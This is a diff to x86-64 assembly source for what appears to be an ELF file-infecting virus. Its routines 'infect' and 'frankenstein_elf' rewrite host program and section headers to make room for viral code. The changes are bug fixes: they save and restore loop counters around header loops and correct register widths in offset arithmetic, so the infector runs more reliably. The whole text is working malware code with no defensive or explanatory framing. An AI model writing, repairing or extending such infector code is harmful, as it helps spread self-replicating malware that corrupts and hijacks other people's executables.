@@ -866,6 +866,7 @@ infect:
 	mov word cx, [r13 + 56]			;elf_ehdr.e_phnum
 	check_phdrs:
 		.phdr_loop:
+			push rcx
 			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
@@ -916,6 +917,7 @@ infect:
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 		.next_phdr:
+			pop rcx
 			dec cx 
 			;add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
 			add r12w, word [r13 + 54] 					 ;add elf_ehdr.e_phentsize to phdr offset in r12 
@@ -934,6 +936,7 @@ infect:
 
 	check_shdrs:
 		.shdr_loop:
+			push rcx
 			cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
 			jge .mod_subsequent_shdr
 			mov r11, [r13 + r15 + elf_shdr.sh_addr]
@@ -949,6 +952,7 @@ infect:
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
 		.next_shdr:
+			pop rcx
 			dec cx 
 			;add r15w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_shentsize to shdr offset in r15 
 			add r15w, word [r13 + 58] 				; add elf_ehdr.e_shentsize to shdr offset in r15 
@@ -1063,6 +1067,7 @@ frankenstein_elf:
 	;before we write the original host data segment to the temp file
 	.write_padding_after_vx:
 		;xor rsi, rsi
+		xor r10, r10
 		mov r10d, dword [vxoffset]
 		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
 		add r10d, dword [PAGESIZE]				;file offset adjusted to vxoffset+vlen
@@ -1089,8 +1094,9 @@ frankenstein_elf:
 		syscall
 
 	.write_patched_shdrs_totemp:
+;		mov rdx, qword [oshoff]
 		mov rdx, [r14 + 48] 	;filestat.st_size
-		sub edx, dword [oshoff]
+		sub rdx, qword [oshoff]
 ;		;lea rsi, [r13 + elf_ehdr]
 		lea rsi, [r13]
 		add rsi, qword [oshoff]
